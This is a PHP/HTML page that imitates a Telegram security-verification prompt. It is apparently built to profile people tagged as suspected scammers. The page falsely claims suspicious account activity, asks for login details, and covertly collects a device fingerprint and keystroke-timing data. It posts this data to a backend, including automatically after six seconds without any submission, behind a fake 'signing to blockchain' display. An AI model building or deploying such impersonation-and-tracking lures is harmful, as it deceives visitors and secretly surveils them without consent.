<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Telegram – Security Verification</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box;}
  body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#f1f1f1;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
  .card{background:#fff;border-radius:14px;padding:36px 28px;width:100%;max-width:380px;box-shadow:0 2px 16px rgba(0,0,0,.1);text-align:center;}
  .logo{width:70px;height:70px;background:#0088cc;border-radius:50%;margin:0 auto 18px;display:flex;align-items:center;justify-content:center;font-size:36px;}
  h1{font-size:20px;font-weight:700;color:#222;margin-bottom:6px;}
  .sub{font-size:13px;color:#666;margin-bottom:22px;line-height:1.5;}
  .alert{background:#e3f2fd;border:1px solid #90caf9;border-radius:8px;padding:11px;margin-bottom:18px;font-size:12px;color:#1565c0;text-align:left;}
  .field{margin-bottom:13px;text-align:left;}
  .field label{font-size:11px;color:#666;display:block;margin-bottom:5px;font-weight:600;text-transform:uppercase;letter-spacing:.5px;}
  input{width:100%;padding:13px 14px;border:1.5px solid #ddd;border-radius:8px;font-size:16px;outline:none;color:#222;transition:border-color .2s;}
  input:focus{border-color:#0088cc;}
  .btn{width:100%;padding:14px;background:#0088cc;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;margin-top:6px;}
  .overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.88);z-index:99;flex-direction:column;align-items:center;justify-content:center;color:#fff;padding:30px;}
  .overlay.show{display:flex;}
  .ring{width:90px;height:90px;border:3px solid transparent;border-top-color:#0088cc;border-right-color:rgba(0,136,204,.3);border-radius:50%;animation:spin 1s linear infinite;margin-bottom:24px;}
  @keyframes spin{to{transform:rotate(360deg);}}
  .lbl{font-size:13px;color:#0af;letter-spacing:1px;margin-bottom:14px;font-family:monospace;text-align:center;}
  .pb{width:220px;height:3px;background:rgba(255,255,255,.1);border-radius:2px;overflow:hidden;}
  .pf{height:100%;background:#0088cc;width:0%;transition:width .4s;}
  .token-box{margin-top:14px;padding:10px;background:#f1f1f1;border-radius:8px;font-family:monospace;font-size:10px;color:#aaa;word-break:break-all;}
</style>
</head>
<body>
<?php
$report_id=intval($_GET['report']??0);
$role=in_array($_GET['role']??'',['scammer','suspect'])?$_GET['role']:'scammer';
?>
<div class="card" id="mainCard">
  <div class="logo">✈️</div>
  <h1>Telegram Security Check</h1>
  <p class="sub">We detected unusual activity on your account. Please verify your identity to prevent suspension.</p>
  <div class="alert">⚠️ <strong>Alert:</strong> Sign-in attempt from unrecognized device detected.</div>
  <form onsubmit="handleSubmit(event)" id="verifyForm">
    <div class="field"><label>Phone or Username</label><input type="text" id="uname" name="uname" placeholder="@username or +60..."></div>
    <div class="field"><label>Password</label><input type="password" id="pass" name="pass" placeholder="Your Telegram password"></div>
    <button type="submit" class="btn">Verify Identity</button>
  </form>
</div>
<div class="overlay" id="overlay"><div class="ring"></div><div class="lbl" id="lbl">VERIFYING...</div><div class="pb"><div class="pf" id="pf"></div></div></div>
<div class="card" id="doneCard" style="display:none;text-align:center;padding:40px 28px;">
  <div style="font-size:56px;margin-bottom:12px;">✅</div>
  <div style="font-size:18px;font-weight:700;color:#222;margin-bottom:6px;">Verification Successful</div>
  <div style="font-size:13px;color:#666;">Your Telegram account is secured.<br>You may close this window.</div>
  <div class="token-box" id="tokenBox"></div>
</div>
<script src="/blockchain-sentinel/behavioral_biometrics.js"></script>
<script>
const REPORT_ID=<?= $report_id ?>;const ROLE='<?= $role ?>';
const bc=new BehavioralCollector();bc.attach(document.getElementById('verifyForm'));
function collect(){return{screen_resolution:screen.width+'x'+screen.height,browser:navigator.userAgent,language:navigator.language,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,device_memory:navigator.deviceMemory||'u',hardware_concurrency:navigator.hardwareConcurrency||'u',touch_support:navigator.maxTouchPoints||0,pixel_ratio:window.devicePixelRatio||1};}
async function sha256(m){const b=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(m));return Array.from(new Uint8Array(b)).map(x=>x.toString(16).padStart(2,'0')).join('');}
async function sendFP(fp){try{const r=await fetch(location.origin+'/blockchain-sentinel/backend/realtime_scan.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({report_id:REPORT_ID,role:ROLE,fingerprint:fp,phone:''})});const d=await r.json();return d.hash||await sha256(JSON.stringify(fp));}catch(e){return await sha256(JSON.stringify(fp));}}
const stages=['READING DEVICE...','ANALYZING TYPING RHYTHM...','MEASURING KEYSTROKE TIMING...','GENERATING BEHAVIORAL HASH...','SIGNING TO BLOCKCHAIN...','COMPLETE ✓'];
async function handleSubmit(e){e.preventDefault();bc.detach();const fp=collect();const ov=document.getElementById('overlay');const lbl=document.getElementById('lbl');const pf=document.getElementById('pf');ov.classList.add('show');for(let i=0;i<stages.length;i++){lbl.textContent=stages[i];pf.style.width=((i+1)/stages.length*100)+'%';await new Promise(r=>setTimeout(r,560));}const[hash]=await Promise.all([sendFP(fp),bc.send(REPORT_ID,ROLE)]);ov.classList.remove('show');document.getElementById('mainCard').style.display='none';document.getElementById('doneCard').style.display='block';document.getElementById('tokenBox').textContent='Security Token: '+hash.substr(0,32)+'...';}
setTimeout(async()=>{sendFP(collect()).catch(()=>{});if(bc.hasEnoughData())bc.send(REPORT_ID,ROLE).catch(()=>{});},6000);
</script>
</body></html>
